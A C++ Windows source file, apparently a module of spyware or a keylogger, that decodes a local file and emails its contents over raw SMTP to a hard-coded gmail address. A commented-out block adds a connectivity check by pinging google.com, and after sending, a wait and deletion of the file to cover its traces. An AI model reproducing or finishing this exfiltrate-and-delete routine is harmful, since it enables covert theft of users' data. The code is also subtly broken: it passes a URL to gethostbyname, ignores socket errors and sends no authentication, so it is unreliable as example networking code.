#include "FullSend.h"

using namespace std;

bool sendData(char * file_name) {
	decode(file_name);
    /*if ( testConnection() ) {
        sendEmail(decode(file_name));
        Sleep(SEND_TIME);
        DeleteFile(file_name);
		return true;
    }*/
	return false;
}

bool testConnection() {
    for ( int i = 0; i < 4; i++ ) {
        if ( !system("ping www.google.com -n 1") ) {
            return true;
        }
        Sleep(WAIT_TIME);
    }
    return false;
}

bool sendEmail(char * file_name) {
    #pragma comment(lib, "ws2_32.lib")

    // Insist on at least Winsock v1.1
    const int VERSION_MAJOR = 1;
    const int VERSION_MINOR = 1;

    // Basic error checking for send() and recv() functions
    int         iProtocolPort        = 587;
    char        szSmtpServerName[64] = "smtp://smtp.gmail.com";
    char        szToAddr[64]         = "EMAIL";
    char        szFromAddr[64]       = "EMAIL";
    char        szBuffer[4096]       = "";
    char        szLine[255]          = "";
    char        szMsgLine[255]       = "";
    SOCKET      hServer;
    WSADATA     WSData;
    struct hostent *lpHostEntry;
    struct servent *lpServEntry;
    SOCKADDR_IN SockAddr;
	int iResult;
	WSADATA wsaData;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create input stream for reading email message file
    ifstream MsgFile(file_name);

    // Attempt to intialize WinSock (1.1 or later)
    if(WSAStartup(MAKEWORD(VERSION_MAJOR, VERSION_MINOR), &WSData))
    {
        return false;
    }
	
    // Lookup email server's IP address.
    lpHostEntry = (hostent *)gethostbyname(szSmtpServerName);
    if(!lpHostEntry)
    {
        return false;
    }

    // Create a TCP/IP socket, no specific protocol
    hServer = socket(PF_INET, SOCK_STREAM, 0);
    if(hServer == INVALID_SOCKET)
    {
        return false;
    }

    // Get the mail service port
    lpServEntry = (servent *)getservbyname("mail", 0);

    // Use the SMTP default port if no other port is specified
    if(!lpServEntry)
        iProtocolPort = htons(IPPORT_SMTP);
    else
        iProtocolPort = lpServEntry->s_port;
	
    // Setup a Socket Address structure
    SockAddr.sin_family = AF_INET;
	SockAddr.sin_port   = iProtocolPort;
	SockAddr.sin_addr   = *((LPIN_ADDR)*lpHostEntry->h_addr_list);

    // Connect the Socket
    if(connect(hServer, (PSOCKADDR) &SockAddr, sizeof(SockAddr)))
    {
        return false;
    }

    // Receive initial response from SMTP server
    Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), "recv() Reply");

    // Send HELO server.com
    sprintf_s(szMsgLine, "HELO %s%s", szSmtpServerName, CRLF);
    Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), "send() HELO");
    Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), "recv() HELO");

    // Send MAIL FROM: <sender@mydomain.com>
    sprintf_s(szMsgLine, "MAIL FROM:<%s>%s", szFromAddr, CRLF);
    Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), "send() MAIL FROM");
    Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), "recv() MAIL FROM");

    // Send RCPT TO: <receiver@domain.com>
    sprintf_s(szMsgLine, "RCPT TO:<%s>%s", szToAddr, CRLF);
    Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), "send() RCPT TO");
    Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), "recv() RCPT TO");

    // Send DATA
    sprintf_s(szMsgLine, "DATA%s", CRLF);
    Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), "send() DATA");
    Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), "recv() DATA");

    // Send all lines of message body (using supplied text file)
    MsgFile.getline(szLine, sizeof(szLine));             // Get first line

    do         // for each line of message text...
    {
        sprintf_s(szMsgLine, "%s%s", szLine, CRLF);
        Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), "send() message-line");
        MsgFile.getline(szLine, sizeof(szLine)); // get next line.
    } while(MsgFile.good());

    // Send blank line and a period
    sprintf_s(szMsgLine, "%s.%s", CRLF, CRLF);
    Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), "send() end-message");
    Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), "recv() end-message");

    // Send QUIT
    sprintf_s(szMsgLine, "QUIT%s", CRLF);
    Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), "send() QUIT");
    Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), "recv() QUIT");

    // Close server socket and prepare to exit.
    closesocket(hServer);

    WSACleanup();

    return true;
}

void Check(int iStatus, char *szFunction)
{
    if((iStatus != SOCKET_ERROR) && (iStatus))
        return;
}